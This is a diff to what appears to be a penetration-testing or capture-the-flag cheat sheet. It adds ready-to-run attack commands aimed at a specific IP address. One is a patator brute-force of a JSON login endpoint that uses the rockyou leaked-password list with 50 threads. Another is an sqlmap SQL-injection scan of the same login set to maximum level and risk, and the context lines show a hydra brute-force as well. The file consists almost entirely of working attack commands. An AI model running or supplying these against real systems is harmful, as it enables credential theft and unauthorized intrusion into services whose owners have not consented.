@@ -31,3 +31,7 @@ hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share
 Brute force attack on login page (with json):
 sudo apt install patator
 patator http_fuzz url="http://188.166.20.197/login" resolve=188.166.20.197:188.166.20.197 method=POST header='Content-Type: application/json' body='{"username":"FILE0","password":"FILE1"}' 0=/usr/share/seclists/Usernames/top-usernames-shortlist.txt 1=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -x ignore:code=401 -t 50
+patator http_fuzz url="http://188.166.20.197/login" resolve=188.166.20.197:188.166.20.197 method=POST header='Content-Type: application/json' body="{\"username\":\"FILE0\",\"password\":\"FILE1\"}" 0=/usr/share/seclists/Usernames/top-usernames-shortlist.txt 1=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -x ignore:code=401 -t 50
+
+SQL injections testing:
+sqlmap -u http://188.166.20.197/login --data="{\"username\":\"*\",\"password\":\"*\"}" --ignore-code 401 --level=5 --risk=3
